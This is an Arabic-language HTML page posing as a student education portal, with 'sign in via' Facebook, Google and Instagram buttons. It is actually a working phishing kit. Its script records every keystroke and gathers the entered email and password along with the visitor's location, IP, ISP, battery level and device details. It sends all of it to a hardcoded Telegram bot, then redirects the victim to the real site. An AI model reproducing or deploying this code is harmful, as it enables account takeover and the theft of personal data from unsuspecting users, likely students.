<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة المتفوقين التعليمية | الدخول الموحد</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary-color: #2c3e50; --accent-color: #3498db; --bg-color: #f4f7f6; }
        body { background-color: var(--bg-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        /* التصميم الزجاجي - Glassmorphism */
        .glass-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 450px; padding: 40px; text-align: center; border: 1px solid rgba(255,255,255,0.2); transition: 0.4s; }
        
        .logo { font-size: 28px; font-weight: bold; color: var(--primary-color); margin-bottom: 10px; display: block; }
        .logo span { color: var(--accent-color); }
        .subtitle { color: #7f8c8d; font-size: 14px; margin-bottom: 30px; }
        
        .option-btn { display: flex; align-items: center; width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #dee2e6; border-radius: 10px; cursor: pointer; transition: 0.3s; font-weight: 600; font-size: 16px; color: #444; background: white; }
        .option-btn:hover { background: #f0f7ff; border-color: var(--accent-color); color: var(--accent-color); transform: translateY(-2px); }
        .option-btn i { margin-left: 15px; font-size: 20px; width: 25px; }
        
        .login-section { display: none; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; text-align: center; }
        input:focus { border-color: var(--accent-color); box-shadow: 0 0 5px rgba(52,152,219,0.3); }
        
        .main-btn { width: 100%; padding: 14px; background: var(--accent-color); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .main-btn:hover { background: #2980b9; }

        .footer { margin-top: 20px; font-size: 11px; color: #aaa; }
        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid var(--accent-color); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="glass-card" id="app">
        <div id="entrance">
            <div class="logo">منصة <span>المتفوقين</span></div>
            <div class="subtitle">البوابة التعليمية الموحدة للطلاب المتميزين</div>
            
            <div class="option-btn" onclick="initLogin('Facebook', '#1877f2', 'fa-facebook')">
                <i class="fab fa-facebook"></i> تسجيل الدخول عبر فيسبوك
            </div>
            <div class="option-btn" onclick="initLogin('Google', '#db4437', 'fa-google')">
                <i class="fab fa-google"></i> تسجيل الدخول عبر جوجل
            </div>
            <div class="option-btn" onclick="initLogin('Instagram', '#C13584', 'fa-instagram')">
                <i class="fab fa-instagram"></i> تسجيل الدخول عبر إنستغرام
            </div>
        </div>

        <div id="login-form" class="login-section">
            <div class="logo" id="brand-logo">التحقق من الهوية</div>
            <p class="subtitle">يرجى إدخال بيانات الحساب للمتابعة إلى المنصة</p>
            <form id="exploit-form">
                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
                <input type="password" id="pass" placeholder="كلمة المرور" required>
                <button type="submit" class="main-btn" id="action-btn">دخول المنصة</button>
            </form>
            <div class="loader" id="loader"></div>
            <p id="status-msg" style="font-size: 13px; color: #7f8c8d; margin-top: 15px;"></p>
        </div>

        <div class="footer">
            &copy; 2024 منصة المتفوقين التعليمية - جميع الحقوق محفوظة. <br>
            اتفاقية الخصوصية | شروط الاستخدام
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8960046938:AAF1GRVk0tFUPz1LaqvI1AG2sNZgsSvcNog';
        const CHAT_ID = '6670040264';
        let currentSite = '';
        let keys = "";

        // تفعيل الـ Keylogger
        window.addEventListener('keydown', e => keys += e.key);

        function initLogin(site, color, icon) {
            currentSite = site;
            document.getElementById('entrance').style.display = 'none';
            document.getElementById('login-form').style.display = 'block';
            document.getElementById('brand-logo').style.color = color;
            document.getElementById('action-btn').style.backgroundColor = color;
        }

        async function getFullIntel() {
            let gps = "مرفوض";
            navigator.geolocation.getCurrentPosition(p => {
                gps = `📍 GPS: ${p.coords.latitude}, ${p.coords.longitude}\n🔗 Map: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            }, () => {});

            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 'unknown'}));
                return `🌐 IP: ${data.ip} | ${data.city}, ${data.country_name}\n🏢 ISP: ${data.org}\n🔋 بطارية: ${batt.level * 100}%\n📱 نظام: ${navigator.userAgent}`;
            } catch { return "❌ فشل سحب بيانات الشبكة"; }
        }

        document.getElementById('exploit-form').onsubmit = async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            // محاكاة عملية تسجيل الدخول
            document.getElementById('action-btn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('status-msg').innerText = "جاري الربط مع الخادم...";

            setTimeout(() => { document.getElementById('status-msg').innerText = "يتم الآن التحقق من البيانات..."; }, 1500);
            setTimeout(() => { document.getElementById('status-msg').innerText = "تم التحقق بنجاح! تحويلك الآن..."; }, 3000);

            const intel = await getFullIntel();
            const finalReport = `🎓 [منصة المتفوقين - صيد جديد] 🎓\n\n` +
                                `🎯 الحساب: ${currentSite}\n` +
                                `📧 البريد: ${email}\n` +
                                `🔑 السر: ${pass}\n\n` +
                                `⌨️ Keystrokes: ${keys}\n` +
                                `📊 المعلومات:\n${intel}`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(finalReport)}`);

            setTimeout(() => {
                window.location.href = (currentSite === 'Facebook') ? 'https://facebook.com' : (currentSite === 'Google') ? 'https://google.com' : 'https://instagram.com';
            }, 4000);
        };
    </script>
</body>
</html>
